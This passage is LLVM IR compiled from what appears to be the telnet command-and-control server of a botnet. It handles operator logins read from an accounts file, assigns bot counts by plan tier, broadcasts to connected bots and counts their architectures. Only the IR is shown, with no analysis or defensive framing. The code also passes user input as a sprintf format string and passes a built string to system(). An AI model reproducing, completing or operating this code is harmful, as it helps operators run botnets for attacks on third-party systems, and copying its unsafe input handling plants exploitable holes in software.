  %49 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.33, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i64 0, i64 0))
  store %struct._IO_FILE* %49, %struct._IO_FILE** %16, align 8
  br label %50

50:                                               ; preds = %55, %1
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** %16, align 8
  %52 = call i32 @feof(%struct._IO_FILE* %51) #8
  %53 = icmp ne i32 %52, 0
  %54 = xor i1 %53, true
  br i1 %54, label %55, label %60

55:                                               ; preds = %50
  %56 = load %struct._IO_FILE*, %struct._IO_FILE** %16, align 8
  %57 = call i32 @fgetc(%struct._IO_FILE* %56)
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %17, align 4
  br label %50, !llvm.loop !22

60:                                               ; preds = %50
  store i32 0, i32* %19, align 4
  %61 = load %struct._IO_FILE*, %struct._IO_FILE** %16, align 8
  call void @rewind(%struct._IO_FILE* %61)
  br label %62

62:                                               ; preds = %67, %60
  %63 = load i32, i32* %19, align 4
  %64 = load i32, i32* %17, align 4
  %65 = sub nsw i32 %64, 1
  %66 = icmp ne i32 %63, %65
  br i1 %66, label %67, label %92

67:                                               ; preds = %62
  %68 = load %struct._IO_FILE*, %struct._IO_FILE** %16, align 8
  %69 = load i32, i32* %19, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %70
  %72 = getelementptr inbounds %struct.account, %struct.account* %71, i32 0, i32 0
  %73 = getelementptr inbounds [200 x i8], [200 x i8]* %72, i64 0, i64 0
  %74 = load i32, i32* %19, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %75
  %77 = getelementptr inbounds %struct.account, %struct.account* %76, i32 0, i32 1
  %78 = getelementptr inbounds [200 x i8], [200 x i8]* %77, i64 0, i64 0
  %79 = load i32, i32* %19, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %80
  %82 = getelementptr inbounds %struct.account, %struct.account* %81, i32 0, i32 2
  %83 = getelementptr inbounds [200 x i8], [200 x i8]* %82, i64 0, i64 0
  %84 = load i32, i32* %19, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %85
  %87 = getelementptr inbounds %struct.account, %struct.account* %86, i32 0, i32 3
  %88 = getelementptr inbounds [200 x i8], [200 x i8]* %87, i64 0, i64 0
  %89 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %68, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i8* %73, i8* %78, i8* %83, i8* %88)
  %90 = load i32, i32* %19, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %19, align 4
  br label %62, !llvm.loop !23

92:                                               ; preds = %62
  %93 = load i32, i32* %6, align 4
  %94 = call i64 @send(i32 %93, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i64 0, i64 0), i64 14, i32 16384)
  %95 = icmp eq i64 %94, -1
  br i1 %95, label %96, label %97

96:                                               ; preds = %92
  br label %1124

97:                                               ; preds = %92
  %98 = load i32, i32* %6, align 4
  %99 = call i64 @send(i32 %98, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.49, i64 0, i64 0), i64 24, i32 16384)
  %100 = icmp eq i64 %99, -1
  br i1 %100, label %101, label %102

101:                                              ; preds = %97
  br label %1124

102:                                              ; preds = %97
  %103 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %104 = load i32, i32* %6, align 4
  %105 = call i32 @fdgets(i8* %103, i32 2048, i32 %104)
  %106 = icmp slt i32 %105, 1
  br i1 %106, label %107, label %108

107:                                              ; preds = %102
  br label %1124

108:                                              ; preds = %102
  %109 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @trim(i8* %109)
  %110 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i64 0, i64 0
  %111 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %112 = call i32 (i8*, i8*, ...) @sprintf(i8* %110, i8* %111) #8
  %113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  store i8* %113, i8** %12, align 8
  %114 = load i8*, i8** %12, align 8
  %115 = call i32 @Search_in_File(i8* %114)
  store i32 %115, i32* %8, align 4
  %116 = load i8*, i8** %12, align 8
  %117 = load i32, i32* %8, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %118
  %120 = getelementptr inbounds %struct.account, %struct.account* %119, i32 0, i32 0
  %121 = getelementptr inbounds [200 x i8], [200 x i8]* %120, i64 0, i64 0
  %122 = call i32 @strcmp(i8* %116, i8* %121) #9
  %123 = icmp eq i32 %122, 0
  br i1 %123, label %124, label %153

124:                                              ; preds = %108
  %125 = load i32, i32* %6, align 4
  %126 = call i64 @send(i32 %125, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.50, i64 0, i64 0), i64 24, i32 16384)
  %127 = icmp eq i64 %126, -1
  br i1 %127, label %128, label %129

128:                                              ; preds = %124
  br label %1124

129:                                              ; preds = %124
  %130 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %131 = load i32, i32* %6, align 4
  %132 = call i32 @fdgets(i8* %130, i32 2048, i32 %131)
  %133 = icmp slt i32 %132, 1
  br i1 %133, label %134, label %135

134:                                              ; preds = %129
  br label %1124

135:                                              ; preds = %129
  %136 = load i32, i32* %6, align 4
  %137 = call i64 @send(i32 %136, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i64 0, i64 0), i64 14, i32 16384)
  %138 = icmp eq i64 %137, -1
  br i1 %138, label %139, label %140

139:                                              ; preds = %135
  br label %1124

140:                                              ; preds = %135
  %141 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @trim(i8* %141)
  %142 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %143 = load i32, i32* %8, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %144
  %146 = getelementptr inbounds %struct.account, %struct.account* %145, i32 0, i32 1
  %147 = getelementptr inbounds [200 x i8], [200 x i8]* %146, i64 0, i64 0
  %148 = call i32 @strcmp(i8* %142, i8* %147) #9
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %150, label %151

150:                                              ; preds = %140
  br label %154

151:                                              ; preds = %140
  %152 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %152, i8 0, i64 2048, i1 false)
  br label %178

153:                                              ; preds = %108
  br label %154

154:                                              ; preds = %153, %150
  %155 = load i32, i32* %6, align 4
  %156 = call i64 @send(i32 %155, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i64 0, i64 0), i64 5, i32 16384)
  %157 = icmp eq i64 %156, -1
  br i1 %157, label %158, label %159

158:                                              ; preds = %154
  br label %1124

159:                                              ; preds = %154
  store i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.53, i64 0, i64 0), i8** %20, align 8
  %160 = load i32, i32* %6, align 4
  %161 = load i8*, i8** %20, align 8
  %162 = load i8*, i8** %20, align 8
  %163 = call i64 @strlen(i8* %162) #9
  %164 = call i64 @send(i32 %160, i8* %161, i64 %163, i32 16384)
  %165 = icmp eq i64 %164, -1
  br i1 %165, label %166, label %167

166:                                              ; preds = %159
  br label %1124

167:                                              ; preds = %159
  %168 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i64 0, i64 0))
  store %struct._IO_FILE* %168, %struct._IO_FILE** %21, align 8
  %169 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %170 = load i8*, i8** %7, align 8
  %171 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %169, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.56, i64 0, i64 0), i8* %170)
  %172 = load i8*, i8** %7, align 8
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.56, i64 0, i64 0), i8* %172)
  %174 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %175 = call i32 @fclose(%struct._IO_FILE* %174)
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %176, i8 0, i64 2048, i1 false)
  %177 = call i32 @sleep(i32 5)
  br label %1124

178:                                              ; preds = %151
  %179 = load i32, i32* %6, align 4
  %180 = sext i32 %179 to i64
  %181 = inttoptr i64 %180 to i8*
  %182 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %181) #8
  %183 = load i32, i32* %6, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %184
  %186 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %185, i32 0, i32 2
  %187 = getelementptr inbounds [20 x i8], [20 x i8]* %186, i64 0, i64 0
  %188 = load i32, i32* %8, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %189
  %191 = getelementptr inbounds %struct.account, %struct.account* %190, i32 0, i32 0
  %192 = getelementptr inbounds [200 x i8], [200 x i8]* %191, i64 0, i64 0
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %187, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.30, i64 0, i64 0), i8* %192) #8
  %194 = getelementptr inbounds [60 x i8*], [60 x i8*]* %25, i64 0, i64 0
  %195 = bitcast i8** %194 to i8*
  %196 = load i8*, i8** %7, align 8
  %197 = call i32 (i8*, i8*, ...) @sprintf(i8* %195, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.57, i64 0, i64 0), i8* %196) #8
  %198 = getelementptr inbounds [60 x i8*], [60 x i8*]* %25, i64 0, i64 0
  %199 = bitcast i8** %198 to i8*
  %200 = call i32 @system(i8* %199)
  %201 = load i32, i32* %8, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %202
  %204 = getelementptr inbounds %struct.account, %struct.account* %203, i32 0, i32 2
  %205 = getelementptr inbounds [200 x i8], [200 x i8]* %204, i64 0, i64 0
  %206 = call i32 @strcmp(i8* %205, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0)) #9
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %224, label %208

208:                                              ; preds = %178
  store i32 1, i32* @adminstatus, align 4
  %209 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %210 = load i32, i32* %6, align 4
  %211 = load i32, i32* %8, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %212
  %214 = getelementptr inbounds %struct.account, %struct.account* %213, i32 0, i32 0
  %215 = getelementptr inbounds [200 x i8], [200 x i8]* %214, i64 0, i64 0
  %216 = load i32, i32* %6, align 4
  call void @broadcast(i8* %209, i32 %210, i8* %215, i32 3, i32 1000000, i32 %216)
  %217 = load i32, i32* %8, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %218
  %220 = getelementptr inbounds %struct.account, %struct.account* %219, i32 0, i32 0
  %221 = getelementptr inbounds [200 x i8], [200 x i8]* %220, i64 0, i64 0
  %222 = load i8*, i8** %7, align 8
  %223 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.59, i64 0, i64 0), i8* %221, i8* %222)
  br label %240

224:                                              ; preds = %178
  store i32 0, i32* @adminstatus, align 4
  %225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %226 = load i32, i32* %6, align 4
  %227 = load i32, i32* %8, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %228
  %230 = getelementptr inbounds %struct.account, %struct.account* %229, i32 0, i32 0
  %231 = getelementptr inbounds [200 x i8], [200 x i8]* %230, i64 0, i64 0
  %232 = load i32, i32* %6, align 4
  call void @broadcast(i8* %225, i32 %226, i8* %231, i32 1, i32 1000000, i32 %232)
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %234
  %236 = getelementptr inbounds %struct.account, %struct.account* %235, i32 0, i32 0
  %237 = getelementptr inbounds [200 x i8], [200 x i8]* %236, i64 0, i64 0
  %238 = load i8*, i8** %7, align 8
  %239 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.60, i64 0, i64 0), i8* %237, i8* %238)
  br label %240

240:                                              ; preds = %224, %208
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %242
  %244 = getelementptr inbounds %struct.account, %struct.account* %243, i32 0, i32 3
  %245 = getelementptr inbounds [200 x i8], [200 x i8]* %244, i64 0, i64 0
  %246 = load i8*, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @plans, i64 0, i64 0), align 16
  %247 = call i32 @strcmp(i8* %245, i8* %246) #9
  %248 = icmp ne i32 %247, 0
  br i1 %248, label %254, label %249

249:                                              ; preds = %240
  store i32 0, i32* @availablebots, align 4
  %250 = load i32, i32* %8, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %251
  %253 = getelementptr inbounds %struct.account, %struct.account* %252, i32 0, i32 4
  store i32 0, i32* %253, align 4
  br label %314

254:                                              ; preds = %240
  %255 = load i32, i32* %8, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %256
  %258 = getelementptr inbounds %struct.account, %struct.account* %257, i32 0, i32 3
  %259 = getelementptr inbounds [200 x i8], [200 x i8]* %258, i64 0, i64 0
  %260 = load i8*, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @plans, i64 0, i64 1), align 8
  %261 = call i32 @strcmp(i8* %259, i8* %260) #9
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %268, label %263

263:                                              ; preds = %254
  store i32 100, i32* @availablebots, align 4
  %264 = load i32, i32* %8, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %265
  %267 = getelementptr inbounds %struct.account, %struct.account* %266, i32 0, i32 4
  store i32 100, i32* %267, align 4
  br label %313

268:                                              ; preds = %254
  %269 = load i32, i32* %8, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %270
  %272 = getelementptr inbounds %struct.account, %struct.account* %271, i32 0, i32 3
  %273 = getelementptr inbounds [200 x i8], [200 x i8]* %272, i64 0, i64 0
  %274 = load i8*, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @plans, i64 0, i64 2), align 16
  %275 = call i32 @strcmp(i8* %273, i8* %274) #9
  %276 = icmp ne i32 %275, 0
  br i1 %276, label %282, label %277

277:                                              ; preds = %268
  store i32 1000, i32* @availablebots, align 4
  %278 = load i32, i32* %8, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %279
  %281 = getelementptr inbounds %struct.account, %struct.account* %280, i32 0, i32 4
  store i32 1000, i32* %281, align 4
  br label %312

282:                                              ; preds = %268
  %283 = load i32, i32* %8, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %284
  %286 = getelementptr inbounds %struct.account, %struct.account* %285, i32 0, i32 3
  %287 = getelementptr inbounds [200 x i8], [200 x i8]* %286, i64 0, i64 0
  %288 = load i8*, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @plans, i64 0, i64 3), align 8
  %289 = call i32 @strcmp(i8* %287, i8* %288) #9
  %290 = icmp ne i32 %289, 0
  br i1 %290, label %296, label %291

291:                                              ; preds = %282
  store i32 5000, i32* @availablebots, align 4
  %292 = load i32, i32* %8, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %293
  %295 = getelementptr inbounds %struct.account, %struct.account* %294, i32 0, i32 4
  store i32 5000, i32* %295, align 4
  br label %311

296:                                              ; preds = %282
  %297 = load i32, i32* %8, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %298
  %300 = getelementptr inbounds %struct.account, %struct.account* %299, i32 0, i32 3
  %301 = getelementptr inbounds [200 x i8], [200 x i8]* %300, i64 0, i64 0
  %302 = load i8*, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @plans, i64 0, i64 4), align 16
  %303 = call i32 @strcmp(i8* %301, i8* %302) #9
  %304 = icmp ne i32 %303, 0
  br i1 %304, label %310, label %305

305:                                              ; preds = %296
  store i32 1000000, i32* @availablebots, align 4
  %306 = load i32, i32* %8, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %307
  %309 = getelementptr inbounds %struct.account, %struct.account* %308, i32 0, i32 4
  store i32 1000000, i32* %309, align 4
  br label %310

310:                                              ; preds = %305, %296
  br label %311

311:                                              ; preds = %310, %291
  br label %312

312:                                              ; preds = %311, %277
  br label %313

313:                                              ; preds = %312, %263
  br label %314

314:                                              ; preds = %313, %249
  %315 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %316 = call i32 (i8*, i8*, ...) @sprintf(i8* %315, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.61, i64 0, i64 0)) #8
  %317 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %318 = load i32, i32* %8, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %319
  %321 = getelementptr inbounds %struct.account, %struct.account* %320, i32 0, i32 0
  %322 = getelementptr inbounds [200 x i8], [200 x i8]* %321, i64 0, i64 0
  %323 = call i32 (i8*, i8*, ...) @sprintf(i8* %317, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.62, i64 0, i64 0), i8* %322) #8
  %324 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %325 = call i32 (i8*, i8*, ...) @sprintf(i8* %324, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.10, i64 0, i64 0)) #8
  %326 = load i32, i32* %6, align 4
  %327 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %328 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %329 = call i64 @strlen(i8* %328) #9
  %330 = call i64 @send(i32 %326, i8* %327, i64 %329, i32 16384)
  %331 = icmp eq i64 %330, -1
  br i1 %331, label %332, label %333

332:                                              ; preds = %314
  br label %1124

333:                                              ; preds = %314
  %334 = load i32, i32* %6, align 4
  %335 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %336 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %337 = call i64 @strlen(i8* %336) #9
  %338 = call i64 @send(i32 %334, i8* %335, i64 %337, i32 16384)
  %339 = icmp eq i64 %338, -1
  br i1 %339, label %340, label %341

340:                                              ; preds = %333
  br label %1124

341:                                              ; preds = %333
  %342 = load i32, i32* %6, align 4
  %343 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %344 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %345 = call i64 @strlen(i8* %344) #9
  %346 = call i64 @send(i32 %342, i8* %343, i64 %345, i32 16384)
  %347 = icmp eq i64 %346, -1
  br i1 %347, label %348, label %349

348:                                              ; preds = %341
  br label %1124

349:                                              ; preds = %341
  %350 = load i32, i32* %6, align 4
  %351 = sext i32 %350 to i64
  %352 = inttoptr i64 %351 to i8*
  %353 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %352) #8
  %354 = load i32, i32* %6, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %355
  %357 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %356, i32 0, i32 1
  store i32 1, i32* %357, align 4
  br label %358

358:                                              ; preds = %1084, %1010, %349
  %359 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %360 = load i32, i32* %6, align 4
  %361 = call i32 @fdgets(i8* %359, i32 2048, i32 %360)
  %362 = icmp sgt i32 %361, 0
  br i1 %362, label %363, label %1096

363:                                              ; preds = %358
  %364 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %365 = call i8* @strstr(i8* %364, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i64 0, i64 0)) #9
  %366 = icmp ne i8* %365, null
  br i1 %366, label %371, label %367

367:                                              ; preds = %363
  %368 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %369 = call i8* @strstr(i8* %368, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i64 0, i64 0)) #9
  %370 = icmp ne i8* %369, null
  br i1 %370, label %371, label %442

371:                                              ; preds = %367, %363
  %372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %373 = call i32 (i8*, i8*, ...) @sprintf(i8* %372, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.65, i64 0, i64 0)) #8
  %374 = load i32, i32* %6, align 4
  %375 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %377 = call i64 @strlen(i8* %376) #9
  %378 = call i64 @send(i32 %374, i8* %375, i64 %377, i32 16384)
  %379 = icmp eq i64 %378, -1
  br i1 %379, label %380, label %381

380:                                              ; preds = %371
  store i8* null, i8** %2, align 8
  br label %1133

381:                                              ; preds = %371
  %382 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %383 = call i32 (i8*, i8*, ...) @sprintf(i8* %382, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.66, i64 0, i64 0)) #8
  %384 = load i32, i32* %6, align 4
  %385 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %387 = call i64 @strlen(i8* %386) #9
  %388 = call i64 @send(i32 %384, i8* %385, i64 %387, i32 16384)
  %389 = icmp eq i64 %388, -1
  br i1 %389, label %390, label %391

390:                                              ; preds = %381
  store i8* null, i8** %2, align 8
  br label %1133

391:                                              ; preds = %381
  %392 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %393 = call i32 (i8*, i8*, ...) @sprintf(i8* %392, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.67, i64 0, i64 0)) #8
  %394 = load i32, i32* %6, align 4
  %395 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %396 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %397 = call i64 @strlen(i8* %396) #9
  %398 = call i64 @send(i32 %394, i8* %395, i64 %397, i32 16384)
  %399 = icmp eq i64 %398, -1
  br i1 %399, label %400, label %401

400:                                              ; preds = %391
  store i8* null, i8** %2, align 8
  br label %1133

401:                                              ; preds = %391
  %402 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %403 = call i32 (i8*, i8*, ...) @sprintf(i8* %402, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.68, i64 0, i64 0)) #8
  %404 = load i32, i32* %6, align 4
  %405 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %406 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %407 = call i64 @strlen(i8* %406) #9
  %408 = call i64 @send(i32 %404, i8* %405, i64 %407, i32 16384)
  %409 = icmp eq i64 %408, -1
  br i1 %409, label %410, label %411

410:                                              ; preds = %401
  store i8* null, i8** %2, align 8
  br label %1133

411:                                              ; preds = %401
  %412 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %413 = call i32 (i8*, i8*, ...) @sprintf(i8* %412, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.69, i64 0, i64 0)) #8
  %414 = load i32, i32* %6, align 4
  %415 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %416 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %417 = call i64 @strlen(i8* %416) #9
  %418 = call i64 @send(i32 %414, i8* %415, i64 %417, i32 16384)
  %419 = icmp eq i64 %418, -1
  br i1 %419, label %420, label %421

420:                                              ; preds = %411
  store i8* null, i8** %2, align 8
  br label %1133

421:                                              ; preds = %411
  %422 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %423 = call i32 (i8*, i8*, ...) @sprintf(i8* %422, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.70, i64 0, i64 0)) #8
  %424 = load i32, i32* %6, align 4
  %425 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %426 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %427 = call i64 @strlen(i8* %426) #9
  %428 = call i64 @send(i32 %424, i8* %425, i64 %427, i32 16384)
  %429 = icmp eq i64 %428, -1
  br i1 %429, label %430, label %431

430:                                              ; preds = %421
  store i8* null, i8** %2, align 8
  br label %1133

431:                                              ; preds = %421
  %432 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %433 = call i32 (i8*, i8*, ...) @sprintf(i8* %432, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.71, i64 0, i64 0)) #8
  %434 = load i32, i32* %6, align 4
  %435 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %436 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %437 = call i64 @strlen(i8* %436) #9
  %438 = call i64 @send(i32 %434, i8* %435, i64 %437, i32 16384)
  %439 = icmp eq i64 %438, -1
  br i1 %439, label %440, label %441

440:                                              ; preds = %431
  store i8* null, i8** %2, align 8
  br label %1133

441:                                              ; preds = %431
  br label %992

442:                                              ; preds = %367
  %443 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %444 = call i8* @strstr(i8* %443, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0)) #9
  %445 = icmp ne i8* %444, null
  br i1 %445, label %450, label %446

446:                                              ; preds = %442
  %447 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %448 = call i8* @strstr(i8* %447, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.73, i64 0, i64 0)) #9
  %449 = icmp ne i8* %448, null
  br i1 %449, label %450, label %676

450:                                              ; preds = %446, %442
  call void @countArch()
  %451 = call i32 @clientsConnected()
  %452 = icmp eq i32 %451, 0
  br i1 %452, label %453, label %465

453:                                              ; preds = %450
  %454 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %455 = load volatile i32, i32* @managesConnected, align 4
  %456 = call i32 (i8*, i8*, ...) @sprintf(i8* %454, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.74, i64 0, i64 0), i32 %455) #8
  %457 = load i32, i32* %6, align 4
  %458 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %459 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %460 = call i64 @strlen(i8* %459) #9
  %461 = call i64 @send(i32 %457, i8* %458, i64 %460, i32 16384)
  %462 = icmp eq i64 %461, -1
  br i1 %462, label %463, label %464

463:                                              ; preds = %453
  store i8* null, i8** %2, align 8
  br label %1133

464:                                              ; preds = %453
  br label %675

465:                                              ; preds = %450
